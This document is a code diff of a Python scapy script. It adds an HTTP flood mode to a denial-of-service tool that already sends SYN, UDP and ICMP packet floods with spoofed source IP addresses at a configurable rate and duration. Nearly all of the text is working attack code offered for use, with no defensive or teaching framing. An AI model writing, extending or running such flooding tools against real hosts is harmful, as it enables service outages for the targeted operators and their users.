@@ -4,6 +4,8 @@ import threading
 import time
 from scapy.all import *
 from scapy.layers.inet import TCP, IP, ICMP, UDP
+from scapy.sendrecv import send
+from scapy.volatile import RandString, RandShort
 
 
 def generate_random_ip():
@@ -22,6 +24,10 @@ def send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip):
             RandString(size=packet_size))
     elif attack_mode == "icmp":
         packet = IP(src=source_ip, dst=target_ip) / ICMP() / Raw(RandString(size=packet_size))
+    elif attack_mode == "http":
+        headers = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)
+        packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port) / headers
+
     else:
         print("Invalid attack mode.")
         return
@@ -30,14 +36,14 @@ def send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip):
 
 
 def dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, duration, attack_mode, spoof_ip):
-    print(f"Target IP: {target_ip}")
-    print(f"Target Port: {target_port}")
+    print(f"Target IP        : {target_ip}")
+    print(f"Target Port      : {target_port}")
     print(f"Number of Packets: {num_packets}")
-    print(f"Packet Size: {packet_size} bytes")
-    print(f"Attack Rate: {attack_rate} packets/second")
-    print(f"Duration: {duration} seconds")
-    print(f"Attack Mode: {attack_mode}")
-    print(f"Spoof IP: {spoof_ip.__name__ if spoof_ip else 'Default'}")
+    print(f"Packet Size      : {packet_size} bytes")
+    print(f"Attack Rate      : {attack_rate} packets/second")
+    print(f"Duration         : {duration} seconds")
+    print(f"Attack Mode      : {attack_mode}")
+    print(f"Spoof IP         : {spoof_ip.__name__ if spoof_ip else 'Default'}")
     print()
 
     delay = 1 / attack_rate if attack_rate > 0 else 0
@@ -71,7 +77,7 @@ def dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, du
     except KeyboardInterrupt:
         print("\nAttack stopped by user.")
 
-    print("Attack completed.")
+    print("\nAttack completed.")
 
 
 if __name__ == '__main__':
@@ -82,7 +88,7 @@ if __name__ == '__main__':
     parser.add_argument('-ps', '--packet_size', type=int, default=64, help='Packet size in bytes (default: 64)')
     parser.add_argument('-ar', '--attack_rate', type=int, default=10, help='Attack rate in packets/second (default: 10)')
     parser.add_argument('-d ', '--duration', type=int, help='Duration of the attack in seconds')
-    parser.add_argument('-am', '--attack-mode', choices=["syn", "udp", "icmp"], default="syn", help='Attack mode (default: syn)')
+    parser.add_argument('-am', '--attack-mode', choices=["syn", "udp", "icmp","http"], default="syn", help='Attack mode (default: syn)')
     parser.add_argument('-sp', '--spoof-ip', default=None, help='Spoof IP address')
 
     args = parser.parse_args()
